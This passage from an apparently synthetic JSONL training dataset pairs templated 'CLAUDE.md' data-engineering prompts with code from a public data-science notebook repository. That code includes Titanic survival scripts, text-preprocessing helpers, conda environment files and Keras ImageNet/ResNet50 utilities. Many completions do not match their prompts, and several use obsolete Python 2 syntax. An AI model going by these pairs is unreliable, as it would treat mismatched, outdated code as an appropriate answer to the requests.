= np.array(prob)\n    outcome = np.array(outcome)\n\n    c = 0.0\n    # Construct bins\n    judgement_bins = np.arange(n_bins + 1) / n_bins\n    # Which bin is each prediction in?\n    bin_num = np.digitize(prob,judgement_bins)\n    for j_bin in np.unique(bin_num):\n        # Is event in bin\n        in_bin = bin_num == j_bin\n        # Predicted probability taken as average of preds in bin\n        predicted_prob = np.mean(prob[in_bin])\n        # How often did events in this bin actually happen?\n        true_bin_prob = np.mean(outcome[in_bin])\n        # Squared distance between predicted and true times num of obs\n        c += np.sum(in_bin) * ((predicted_prob - true_bin_prob) ** 2)\n    return c / len(prob)\n\ndef discrimination(prob,outcome,n_bins=10):\n    \"\"\"Discrimination measurement for a set of predictions.\n\n    For each judgement category, how far from the base probability\n    is the true frequency of that bin?\n    NOTE: High scores are better\n\n    prob: array_like, float\n        Probability estimates for a set of events\n\n    outcome: array_like, bool\n        If event predicted occurred\n\n    n_bins: int\n        Number of judgement categories to prefrom calculation over.\n        Prediction are binned based on probability, since \"descrete\" \n        probabilities aren't required. \n\n    \"\"\"\n    prob = np.array(prob)\n    outcome = np.array(outcome)\n\n    d = 0.0\n    # Base frequency of outcomes\n    base_prob = np.mean(outcome)\n    # Construct bins\n    judgement_bins = np.arange(n_bins + 1) / n_bins\n    # Which bin is each prediction in?\n    bin_num = np.digitize(prob,judgement_bins)\n    for j_bin in np.unique(bin_num):\n        in_bin = bin_num == j_bin\n        true_bin_prob = np.mean(outcome[in_bin])\n        # Squared distance between true and base times num of obs\n        d += np.sum(in_bin) * ((true_bin_prob - base_prob) ** 2)\n    return d / len(prob)\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "analyses/churn_measurements.py", "language": "python", "complexity": "simple", "star_count": 28407, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\" Now that the user can read in a file this creates a model which uses the price, class and gender\nAuthor : AstroDave\nDate : 18th September 2012\nRevised : 28 March 2014\n\n\"\"\"\n\n\nimport csv as csv\nimport numpy as np\n\ncsv_file_object = csv.reader(open('train.csv', 'rb'))       # Load in the csv file\nheader = csv_file_object.next()                             # Skip the fist line as it is a header\ndata=[]                                                     # Create a variable to hold the data\n\nfor row in csv_file_object:                 # Skip through each row in the csv file\n    data.append(row)                        # adding each row to the data variable\ndata = np.array(data)                       # Then convert from a list to an array\n\n# In order to analyse the price column I need to bin up that data\n# here are my binning parameters, the problem we face is some of the fares are very large\n# So we can either have a lot of bins with nothing in them or we can just lose some\n# information by just considering that anythng over 39 is simply in the last bin.\n# So we add a ceiling\nfare_ceiling = 40\n# then modify the data in the Fare column to = 39, if it is greater or equal to the ceiling\ndata[ data[0::,9].astype(np.float) >= fare_ceiling, 9 ] = fare_ceiling - 1.0\n\nfare_bracket_size = 10\nnumber_of_price_brackets = fare_ceiling / fare_bracket_size\nnumber_of_classes = 3                             # I know there were 1st, 2nd and 3rd classes on board.\nnumber_of_classes = len(np.unique(data[0::,2]))   # But it's better practice to calculate this from the Pclass directly:\n                                                  # just take the length of an array of UNIQUE values in column index 2\n\n\n# This reference matrix will show the proportion of survivors as a sorted table of\n# gender, class and ticket fare.\n# First initialize it with all zeros\nsurvival_table = np.zeros([2,number_of_classes,number_of_price_brackets],float)\n\n# I can now find the stats of all the women and men on board\nfor i in xrange(number_of_classes):\n    for j in xrange(number_of_price_brackets):\n\n        women_only_stats = data[ (data[0::,4] == \"female\") \\\n                                 & (data[0::,2].astype(np.float) == i+1) \\\n                                 & (data[0:,9].astype(np.float) >= j*fare_bracket_size) \\\n                                 & (data[0:,9].astype(np.float) < (j+1)*fare_bracket_size), 1]\n\n        men_only_stats = data[ (data[0::,4] != \"female\") \\\n                                 & (data[0::,2].astype(np.float) == i+1) \\\n                                 & (data[0:,9].astype(np.float) >= j*fare_bracket_size) \\\n                                 & (data[0:,9].astype(np.float) < (j+1)*fare_bracket_size), 1]\n\n                                 #if i == 0 and j == 3:\n\n        survival_table[0,i,j] = np.mean(women_only_stats.astype(np.float))  # Female stats\n        survival_table[1,i,j] = np.mean(men_only_stats.astype(np.float))    # Male stats\n\n# Since in python if it tries to find the mean of an array with nothing in it\n# (such that the denominator is 0), then it returns nan, we can convert these to 0\n# by just saying where does the array not equal the array, and set these to 0.\nsurvival_table[ survival_table != survival_table ] = 0.\n\n# Now I have my proportion of survivors, simply round them such that if <0.5\n# I predict they dont surivive, and if >= 0.5 they do\nsurvival_table[ survival_table < 0.5 ] = 0\nsurvival_table[ survival_table >= 0.5 ] = 1\n\n# Now I have my indicator I can read in the test file and write out\n# if a women then survived(1) if a man then did not survived (0)\n# First read in test\ntest_file = open('test.csv', 'rb')\ntest_file_object = csv.reader(test_file)\nheader = test_file_object.next()\n\n# Also open the a new file so I can write to it. \npredictions_file = open(\"genderclassmodel.csv\", \"wb\")\npredictions_file_object = csv.writer(predictions_file)\npredictions_file_object.writerow([\"PassengerId\", \"Survived\"])\n\n# First thing to do is bin up the price file\nfor row in test_file_object:\n    for j in xrange(number_of_price_brackets):\n        # If there is no fare then place the price of the ticket according to class\n        try:\n            row[8] = float(row[8])    # No fare recorded will come up as a string so\n                                      # try to make it a float\n        except:                       # If fails then just bin the fare according to the class\n            bin_fare = 3 - float(row[1])\n            break                     # Break from the loop and move to the next row\n        if row[8] > fare_ceiling:     # Otherwise now test to see if it is higher\n                                      # than the fare ceiling we set earlier\n            bin_fare = number_of_price_brackets - 1\n            break                     # And then break to the next row\n\n        if row[8] >= j*fare_bracket_size\\\n            and row[8] < (j+1)*fare_bracket_size:     # If passed these tests then loop through\n                                                      # each bin until you find the right one\n                                                      # append it to the bin_fare\n                                                      # and move to the next loop\n            bin_fare = j\n            break\n        # Now I have the binned fare, passenger class, and whether female or male, we can\n        # just cross ref their details with our survival table\n    if row[3] == 'female':\n        predictions_file_object.writerow([row[0], \"%d\" % int(survival_table[ 0, float(row[1]) - 1, bin_fare ])])\n    else:\n        predictions_file_object.writerow([row[0], \"%d\" % int(survival_table[ 1, float(row[1]) - 1, bin_fare])])\n\n# Close out the files\ntest_file.close()\npredictions_file.close()", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "data/titanic/genderclassmodel.py", "language": "python", "complexity": "medium", "star_count": 28407, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\" This simple code is desinged to teach a basic user to read in the files in python, simply find what proportion of males and females survived and make a predictive model based on this\nAuthor : AstroDave\nDate : 18 September 2012\nRevised: 28 March 2014\n\n\"\"\"\n\n\nimport csv as csv\nimport numpy as np\n\ncsv_file_object = csv.reader(open('train.csv', 'rb')) \t# Load in the csv file\nheader = csv_file_object.next() \t\t\t\t\t\t# Skip the fist line as it is a header\ndata=[] \t\t\t\t\t\t\t\t\t\t\t\t# Create a variable to hold the data\n\nfor row in csv_file_object: \t\t\t\t\t\t\t# Skip through each row in the csv file,\n    data.append(row[0:]) \t\t\t\t\t\t\t\t# adding each row to the data variable\ndata = np.array(data) \t\t\t\t\t\t\t\t\t# Then convert from a list to an array.\n\n# Now I have an array of 12 columns and 891 rows\n# I can access any element I want, so the entire first column would\n# be data[0::,0].astype(np.float) -- This means all of the rows (from start to end), in column 0\n# I have to add the .astype() command, because\n# when appending the rows, python thought it was a string - so needed to convert\n\n# Set some variables\nnumber_passengers = np.size(data[0::,1].astype(np.float))\nnumber_survived = np.sum(data[0::,1].astype(np.float))\nproportion_survivors = number_survived / number_passengers \n\n# I can now find the stats of all the women on board,\n# by making an array that lists True/False whether each row is female\nwomen_only_stats = data[0::,4] == \"female\" \t# This finds where all the women are\nmen_only_stats = data[0::,4] != \"female\" \t# This finds where all the men are (note != means 'not equal')\n\n# I can now filter the whole data, to find statistics for just women, by just placing\n# women_only_stats as a \"mask\" on my full data -- Use it in place of the '0::' part of the array index. \n# You can test it by placing it there, and requesting column index [4], and the output should all read 'female'\n# e.g. try typing this:   data[women_only_stats,4]\nwomen_onboard = data[women_only_stats,1].astype(np.float)\nmen_onboard = data[men_only_stats,1].astype(np.float)\n\n# and derive some statistics about them\nproportion_women_survived = np.sum(women_onboard) / np.size(women_onboard)\nproportion_men_survived = np.sum(men_onboard) / np.size(men_onboard)\n\nprint 'Proportion of women who survived is %s' % proportion_women_survived\nprint 'Proportion of men who survived is %s' % proportion_men_survived\n\n# Now that I have my indicator that women were much more likely to survive,\n# I am done with the training set.\n# Now I will read in the test file and write out my simplistic prediction:\n# if female, then model that she survived (1) \n# if male, then model that he did not survive (0)\n\n# First, read in test.csv\ntest_file = open('test.csv', 'rb')\ntest_file_object = csv.reader(test_file)\nheader = test_file_object.next()\n\n# Also open the a new file so I can write to it. Call it something descriptive\n# Finally, loop through each row in the train file, and look in column index [3] (which is 'Sex')\n# Write out the PassengerId, and my prediction.\n\npredictions_file = open(\"gendermodel.csv\", \"wb\")\npredictions_file_object = csv.writer(predictions_file)\npredictions_file_object.writerow([\"PassengerId\", \"Survived\"])\t# write the column headers\nfor row in test_file_object:\t\t\t\t\t\t\t\t\t# For each row in test file,\n    if row[3] == 'female':\t\t\t\t\t\t\t\t\t\t# is it a female, if yes then\n        predictions_file_object.writerow([row[0], \"1\"])\t\t\t# write the PassengerId, and predict 1\n    else:\t\t\t\t\t\t\t\t\t\t\t\t\t\t# or else if male,\n        predictions_file_object.writerow([row[0], \"0\"])\t\t\t# write the PassengerId, and predict 0.\ntest_file.close()\t\t\t\t\t\t\t\t\t\t\t\t# Close out the files.\npredictions_file.close()\n\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "data/titanic/gendermodel.py", "language": "python", "complexity": "simple", "star_count": 28407, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import numpy as np\nimport re\nimport itertools\nfrom collections import Counter\n\"\"\"\nOriginal taken from https://github.com/dennybritz/cnn-text-classification-tf\n\"\"\"\n\ndef clean_str(string):\n    \"\"\"\n    Tokenization/string cleaning for all datasets except for SST.\n    Original taken from https://github.com/yoonkim/CNN_sentence/blob/master/process_data.py\n    \"\"\"\n    string = re.sub(r\"[^A-Za-z0-9(),!?\\'\\`]\", \" \", string)\n    string = re.sub(r\"\\'s\", \" \\'s\", string)\n    string = re.sub(r\"\\'ve\", \" \\'ve\", string)\n    string = re.sub(r\"n\\'t\", \" n\\'t\", string)\n    string = re.sub(r\"\\'re\", \" \\'re\", string)\n    string = re.sub(r\"\\'d\", \" \\'d\", string)\n    string = re.sub(r\"\\'ll\", \" \\'ll\", string)\n    string = re.sub(r\",\", \" , \", string)\n    string = re.sub(r\"!\", \" ! \", string)\n    string = re.sub(r\"\\(\", \" \\( \", string)\n    string = re.sub(r\"\\)\", \" \\) \", string)\n    string = re.sub(r\"\\?\", \" \\? \", string)\n    string = re.sub(r\"\\s{2,}\", \" \", string)\n    return string.strip().lower()\n\n\ndef load_data_and_labels():\n    \"\"\"\n    Loads MR polarity data from files, splits the data into words and generates labels.\n    Returns split sentences and labels.\n    \"\"\"\n    # Load data from files\n    positive_examples = list(open(\"./data/rt-polarity.pos\", encoding='ISO-8859-1').readlines())\n    positive_examples = [s.strip() for s in positive_examples]\n    negative_examples = list(open(\"./data/rt-polarity.neg\", encoding='ISO-8859-1').readlines())\n    negative_examples = [s.strip() for s in negative_examples]\n    # Split by words\n    x_text = positive_examples + negative_examples\n    x_text = [clean_str(sent) for sent in x_text]\n    x_text = [s.split(\" \") for s in x_text]\n    # Generate labels\n    positive_labels = [[0, 1] for _ in positive_examples]\n    negative_labels = [[1, 0] for _ in negative_examples]\n    y = np.concatenate([positive_labels, negative_labels], 0)\n    return [x_text, y]\n\n\ndef pad_sentences(sentences, padding_word=\"<PAD/>\"):\n    \"\"\"\n    Pads all sentences to the same length. The length is defined by the longest sentence.\n    Returns padded sentences.\n    \"\"\"\n    sequence_length = max(len(x) for x in sentences)\n    padded_sentences = []\n    for i in range(len(sentences)):\n        sentence = sentences[i]\n        num_padding = sequence_length - len(sentence)\n        new_sentence = sentence + [padding_word] * num_padding\n        padded_sentences.append(new_sentence)\n    return padded_sentences\n\n\ndef build_vocab(sentences):\n    \"\"\"\n    Builds a vocabulary mapping from word to index based on the sentences.\n    Returns vocabulary mapping and inverse vocabulary mapping.\n    \"\"\"\n    # Build vocabulary\n    word_counts = Counter(itertools.chain(*sentences))\n    # Mapping from index to word\n    vocabulary_inv = [x[0] for x in word_counts.most_common()]\n    # Mapping from word to index\n    vocabulary = {x: i for i, x in enumerate(vocabulary_inv)}\n    return [vocabulary, vocabulary_inv]\n\n\ndef build_input_data(sentences, labels, vocabulary):\n    \"\"\"\n    Maps sentencs and labels to vectors based on a vocabulary.\n    \"\"\"\n    x = np.array([[vocabulary[word] for word in sentence] for sentence in sentences])\n    y = np.array(labels)\n    return [x, y]\n\n\ndef load_data():\n    \"\"\"\n    Loads and preprocessed data for the MR dataset.\n    Returns input vectors, labels, vocabulary, and inverse vocabulary.\n    \"\"\"\n    # Load and preprocess data\n    sentences, labels = load_data_and_labels()\n    sentences_padded = pad_sentences(sentences)\n    vocabulary, vocabulary_inv = build_vocab(sentences_padded)\n    x, y = build_input_data(sentences_padded, labels, vocabulary)\n    return [x, y, vocabulary, vocabulary_inv]\n\n\ndef batch_iter(data, batch_size, num_epochs):\n    \"\"\"\n    Generates a batch iterator for a dataset.\n    \"\"\"\n    data = np.array(data)\n    data_size = len(data)\n    num_batches_per_epoch = int(len(data)/batch_size) + 1\n    for epoch in range(num_epochs):\n        # Shuffle the data at each epoch\n        shuffle_indices = np.random.permutation(np.arange(data_size))\n        shuffled_data = data[shuffle_indices]\n        for batch_num in range(num_batches_per_epoch):\n            start_index = batch_num * batch_size\n            end_index = min((batch_num + 1) * batch_size, data_size)\n            yield shuffled_data[start_index:end_index]", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/data_helpers.py", "language": "python", "complexity": "medium", "star_count": 28407, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: deep-learning\nchannels:\n- conda-forge\n- defaults\ndependencies:\n- accelerate=2.3.0=np111py35_3\n- accelerate_cudalib=2.0=0\n- appnope=0.1.0=py35_0\n- bokeh=0.12.1=py35_0\n- cffi=1.6.0=py35_0\n- backports.shutil_get_terminal_size=1.0.0=py35_0\n- blas=1.1=openblas\n- ca-certificates=2016.8.2=3\n- certifi=2016.8.2=py35_0\n- cycler=0.10.0=py35_0\n- cython=0.24.1=py35_0\n- decorator=4.0.10=py35_0\n- entrypoints=0.2.2=py35_0\n- freetype=2.6.3=1\n- h5py=2.6.0=np111py35_6\n- hdf5=1.8.17=2\n- ipykernel=4.3.1=py35_1\n- ipython=5.1.0=py35_0\n- ipywidgets=5.2.2=py35_0\n- jinja2=2.8=py35_1\n- jsonschema=2.5.1=py35_0\n- jupyter_client=4.3.0=py35_0\n- jupyter_console=5.0.0=py35_0\n- jupyter_core=4.1.1=py35_1\n- libgfortran=3.0.0=0\n- libpng=1.6.24=0\n- libsodium=1.0.10=0\n- markupsafe=0.23=py35_0\n- matplotlib=1.5.2=np111py35_5\n- mistune=0.7.3=py35_0\n- nbconvert=4.2.0=py35_0\n- nbformat=4.0.1=py35_0\n- ncurses=5.9=8\n- nose=1.3.7=py35_1\n- notebook=4.2.2=py35_0\n- numpy=1.11.1=py35_blas_openblas_201\n- openblas=0.2.18=4\n- openssl=1.0.2h=2\n- pandas=0.18.1=np111py35_1\n- pexpect=4.2.0=py35_1\n- pickleshare=0.7.3=py35_0\n- pip=8.1.2=py35_0\n- prompt_toolkit=1.0.6=py35_0\n- ptyprocess=0.5.1=py35_0\n- pygments=2.1.3=py35_1\n- pyparsing=2.1.7=py35_0\n- python=3.5.2=2\n- python-dateutil=2.5.3=py35_0\n- pytz=2016.6.1=py35_0\n- pyyaml=3.11=py35_0\n- pyzmq=15.4.0=py35_0\n- qtconsole=4.2.1=py35_0\n- readline=6.2=0\n- requests=2.11.0=py35_0\n- scikit-learn=0.17.1=np111py35_blas_openblas_201\n- scipy=0.18.0=np111py35_blas_openblas_201\n- setuptools=25.1.6=py35_0\n- simplegeneric=0.8.1=py35_0\n- sip=4.18=py35_0\n- six=1.10.0=py35_0\n- sqlite=3.13.0=1\n- terminado=0.6=py35_0\n- tk=8.5.19=0\n- tornado=4.4.1=py35_1\n- traitlets=4.2.2=py35_0\n- wcwidth=0.1.7=py35_0\n- wheel=0.29.0=py35_0\n- widgetsnbextension=1.2.6=py35_3\n- xz=5.2.2=0\n- yaml=0.1.6=0\n- zeromq=4.1.5=0\n- zlib=1.2.8=3\n- cudatoolkit=7.5=0\n- ipython_genutils=0.1.0=py35_0\n- jupyter=1.0.0=py35_3\n- llvmlite=0.11.0=py35_0\n- mkl=11.3.3=0\n- mkl-service=1.1.2=py35_2\n- numba=0.26.0=np111py35_0\n- pycparser=2.14=py35_1\n- pyqt=4.11.4=py35_4\n- python.app=1.2=py35_4\n- qt=4.8.7=4\n- snakeviz=0.4.1=py35_0\n- pip:\n  - backports.shutil-get-terminal-size==1.0.0\n  - certifi==2016.8.2\n  - cycler==0.10.0\n  - cython==0.24.1\n  - decorator==4.0.10\n  - h5py==2.6.0\n  - ipykernel==4.3.1\n  - ipython==5.1.0\n  - ipython-genutils==0.1.0\n  - ipywidgets==5.2.2\n  - jinja2==2.8\n  - jsonschema==2.5.1\n  - jupyter-client==4.3.0\n  - jupyter-console==5.0.0\n  - jupyter-core==4.1.1\n  - keras==1.0.7\n  - markupsafe==0.23\n  - matplotlib==1.5.2\n  - mistune==0.7.3\n  - nbconvert==4.2.0\n  - nbformat==4.0.1\n  - nose==1.3.7\n  - notebook==4.2.2\n  - numpy==1.11.1\n  - pandas==0.18.1\n  - pexpect==4.2.0\n  - pickleshare==0.7.3\n  - pip==8.1.2\n  - prompt-toolkit==1.0.6\n  - ptyprocess==0.5.1\n  - pygments==2.1.3\n  - pyparsing==2.1.7\n  - python-dateutil==2.5.3\n  - pytz==2016.6.1\n  - pyyaml==3.11\n  - pyzmq==15.4.0\n  - qtconsole==4.2.1\n  - requests==2.11.0\n  - scikit-learn==0.17.1\n  - scipy==0.18.0\n  - setuptools==25.1.6\n  - simplegeneric==0.8.1\n  - six==1.10.0\n  - terminado==0.6\n  - theano==0.8.2\n  - tornado==4.4.1\n  - traitlets==4.2.2\n  - wcwidth==0.1.7\n  - wheel==0.29.0\n  - widgetsnbextension==1.2.6\nprefix: /Users/valerio/anaconda/envs/deep-learning\n\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/deep-learning-osx.yml", "language": "yaml", "complexity": "medium", "star_count": 28407, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: deep-learning\nchannels:\n- conda-forge\n- defaults\ndependencies:\n- accelerate=2.3.0=np111py35_3\n- accelerate_cudalib=2.0=0\n- bokeh=0.12.1=py35_0\n- cffi=1.6.0=py35_0\n- backports.shutil_get_terminal_size=1.0.0=py35_0\n- blas=1.1=openblas\n- ca-certificates=2016.8.2=3\n- cairo=1.12.18=8\n- certifi=2016.8.2=py35_0\n- cycler=0.10.0=py35_0\n- cython=0.24.1=py35_0\n- decorator=4.0.10=py35_0\n- entrypoints=0.2.2=py35_0\n- fontconfig=2.11.1=3\n- freetype=2.6.3=1\n- gettext=0.19.7=1\n- glib=2.48.0=4\n- h5py=2.6.0=np111py35_6\n- harfbuzz=1.0.6=0\n- hdf5=1.8.17=2\n- icu=56.1=4\n- ipykernel=4.3.1=py35_1\n- ipython=5.1.0=py35_0\n- ipywidgets=5.2.2=py35_0\n- jinja2=2.8=py35_1\n- jpeg=9b=0\n- jsonschema=2.5.1=py35_0\n- jupyter_client=4.3.0=py35_0\n- jupyter_console=5.0.0=py35_0\n- jupyter_core=4.1.1=py35_1\n- libffi=3.2.1=2\n- libiconv=1.14=3\n- libpng=1.6.24=0\n- libsodium=1.0.10=0\n- libtiff=4.0.6=6\n- libxml2=2.9.4=0\n- markupsafe=0.23=py35_0\n- matplotlib=1.5.2=np111py35_6\n- mistune=0.7.3=py35_0\n- nbconvert=4.2.0=py35_0\n- nbformat=4.0.1=py35_0\n- ncurses=5.9=8\n- nose=1.3.7=py35_1\n- notebook=4.2.2=py35_0\n- numpy=1.11.1=py35_blas_openblas_201\n- openblas=0.2.18=4\n- openssl=1.0.2h=2\n- pandas=0.18.1=np111py35_1\n- pango=1.40.1=0\n- path.py=8.2.1=py35_0\n- pcre=8.38=1\n- pexpect=4.2.0=py35_1\n- pickleshare=0.7.3=py35_0\n- pip=8.1.2=py35_0\n- pixman=0.32.6=0\n- prompt_toolkit=1.0.6=py35_0\n- protobuf=3.0.0b3=py35_1\n- ptyprocess=0.5.1=py35_0\n- pygments=2.1.3=py35_1\n- pyparsing=2.1.7=py35_0\n- python=3.5.2=2\n- python-dateutil=2.5.3=py35_0\n- pytz=2016.6.1=py35_0\n- pyyaml=3.11=py35_0\n- pyzmq=15.4.0=py35_0\n- qt=4.8.7=0\n- qtconsole=4.2.1=py35_0\n- readline=6.2=0\n- requests=2.11.0=py35_0\n- scikit-learn=0.17.1=np111py35_blas_openblas_201\n- scipy=0.18.0=np111py35_blas_openblas_201\n- setuptools=25.1.6=py35_0\n- simplegeneric=0.8.1=py35_0\n- sip=4.18=py35_0\n- six=1.10.0=py35_0\n- sqlite=3.13.0=1\n- terminado=0.6=py35_0\n- tk=8.5.19=0\n- tornado=4.4.1=py35_1\n- traitlets=4.2.2=py35_0\n- wcwidth=0.1.7=py35_0\n- wheel=0.29.0=py35_0\n- widgetsnbextension=1.2.6=py35_3\n- xz=5.2.2=0\n- yaml=0.1.6=0\n- zeromq=4.1.5=0\n- zlib=1.2.8=3\n- cudatoolkit=7.5=0\n- ipython_genutils=0.1.0=py35_0\n- jupyter=1.0.0=py35_3\n- libgfortran=3.0.0=1\n- llvmlite=0.11.0=py35_0\n- mkl=11.3.3=0\n- mkl-service=1.1.2=py35_2\n- numba=0.26.0=np111py35_0\n- pycparser=2.14=py35_1\n- pyqt=4.11.4=py35_4\n- snakeviz=0.4.1=py35_0\n- pip:\n  - backports.shutil-get-terminal-size==1.0.0\n  - certifi==2016.8.2\n  - cycler==0.10.0\n  - cython==0.24.1\n  - decorator==4.0.10\n  - h5py==2.6.0\n  - ipykernel==4.3.1\n  - ipython==5.1.0\n  - ipython-genutils==0.1.0\n  - ipywidgets==5.2.2\n  - jinja2==2.8\n  - jsonschema==2.5.1\n  - jupyter-client==4.3.0\n  - jupyter-console==5.0.0\n  - jupyter-core==4.1.1\n  - keras==1.0.7\n  - mako==1.0.4\n  - markupsafe==0.23\n  - matplotlib==1.5.2\n  - mistune==0.7.3\n  - nbconvert==4.2.0\n  - nbformat==4.0.1\n  - nose==1.3.7\n  - notebook==4.2.2\n  - numpy==1.11.1\n  - pandas==0.18.1\n  - path.py==8.2.1\n  - pexpect==4.2.0\n  - pickleshare==0.7.3\n  - pip==8.1.2\n  - prompt-toolkit==1.0.6\n  - protobuf==3.0.0b2\n  - ptyprocess==0.5.1\n  - pygments==2.1.3\n  - pyparsing==2.1.7\n  - python-dateutil==2.5.3\n  - pytz==2016.6.1\n  - pyyaml==3.11\n  - pyzmq==15.4.0\n  - qtconsole==4.2.1\n  - requests==2.11.0\n  - scikit-learn==0.17.1\n  - scipy==0.18.0\n  - setuptools==25.1.4\n  - simplegeneric==0.8.1\n  - six==1.10.0\n  - terminado==0.6\n  - theano==0.8.2\n  - tornado==4.4.1\n  - traitlets==4.2.2\n  - wcwidth==0.1.7\n  - wheel==0.29.0\n  - widgetsnbextension==1.2.6\nprefix: /home/valerio/anaconda3/envs/deep-learning\n\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/deep-learning.yml", "language": "yaml", "complexity": "medium", "star_count": 28407, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import numpy as np\nimport json\n\nfrom keras.utils.data_utils import get_file\nfrom keras import backend as K\n\nCLASS_INDEX = None\nCLASS_INDEX_PATH = 'https://s3.amazonaws.com/deep-learning-models/image-models/imagenet_class_index.json'\n\n\ndef preprocess_input(x, dim_ordering='default'):\n    if dim_ordering == 'default':\n        dim_ordering = K.image_dim_ordering()\n    assert dim_ordering in {'tf', 'th'}\n\n    if dim_ordering == 'th':\n        x[:, 0, :, :] -= 103.939\n        x[:, 1, :, :] -= 116.779\n        x[:, 2, :, :] -= 123.68\n        # 'RGB'->'BGR'\n        x = x[:, ::-1, :, :]\n    else:\n        x[:, :, :, 0] -= 103.939\n        x[:, :, :, 1] -= 116.779\n        x[:, :, :, 2] -= 123.68\n        # 'RGB'->'BGR'\n        x = x[:, :, :, ::-1]\n    return x\n\n\ndef decode_predictions(preds):\n    global CLASS_INDEX\n    assert len(preds.shape) == 2 and preds.shape[1] == 1000\n    if CLASS_INDEX is None:\n        fpath = get_file('imagenet_class_index.json',\n                         CLASS_INDEX_PATH,\n                         cache_subdir='models')\n        CLASS_INDEX = json.load(open(fpath))\n    indices = np.argmax(preds, axis=-1)\n    results = []\n    for i in indices:\n        results.append(CLASS_INDEX[str(i)])\n    return results\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/deep_learning_models/imagenet_utils.py", "language": "python", "complexity": "simple", "star_count": 28407, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# -*- coding: utf-8 -*-\n'''ResNet50 model for Keras.\n\n# Reference:\n\n- [Deep Residual Learning for Image Recognition](https://arxiv.org/abs/1512.03385)\n\nAdapted from code contributed by BigMoyan.\n'''\nfrom __future__ import print_function\n\nimport numpy as np\nimport warnings\n\nfrom keras.layers import merge, Input\nfrom keras.layers import Dense, Activation, Flatten\nfrom keras.layers import Convolution2D, MaxPooling2D, ZeroPadding2D, AveragePooling2D\nfrom keras.layers import BatchNormalization\nfrom keras.models import Model\nfrom keras.preprocessing import image\nimport keras.backend as K\nfrom keras.utils.layer_utils import convert_all_kernels_in_model\nfrom keras.utils.data_utils import get_file\n\n\nTH_WEIGHTS_PATH = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/resnet50_weights_th_dim_ordering_th_kernels.h5'\nTF_WEIGHTS_PATH = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/resnet50_weights_tf_dim_ordering_tf_kernels.h5'\nTH_WEIGHTS_PATH_NO_TOP = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/resnet50_weights_th_dim_ordering_th_kernels_notop.h5'\nTF_WEIGHTS_PATH_NO_TOP = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/resnet50_weights_tf_dim_ordering_tf_kernels_notop.h5'\n\n\ndef identity_block(input_tensor, kernel_size, filters, stage, block):\n    '''The identity_block is the block that has no conv layer at shortcut\n\n    # Arguments\n        input_tensor: input tensor\n        kernel_size: defualt 3, the kernel size of middle conv layer at main path\n        filters: list of integers, the nb_filters of 3 conv layer at main path\n        stage: integer, current stage label, used for generating layer names\n        block: 'a','b'..., current block label, used for generating layer names\n    '''\n    nb_filter1, nb_filter2, nb_filter3 = filters\n    if K.image_dim_ordering() == 'tf':\n        bn_axis = 3\n    else:\n        bn_axis = 1\n    conv_name_base = 'res' + str(stage) + block + '_branch'\n    bn_name_base = 'bn' + str(stage) + block + '_branch'\n\n    x = Convolution2D(nb_filter1, 1, 1, name=conv_name_base + '2a')(input_tensor)\n    x = BatchNormalization(axis=bn_axis, name=bn_name_base + '2a')(x)\n    x = Activation('relu')(x)\n\n    x = Convolution2D(nb_filter2, kernel_size, kernel_size,\n                      border_mode='same', name=conv_name_base + '2b')(x)\n    x = 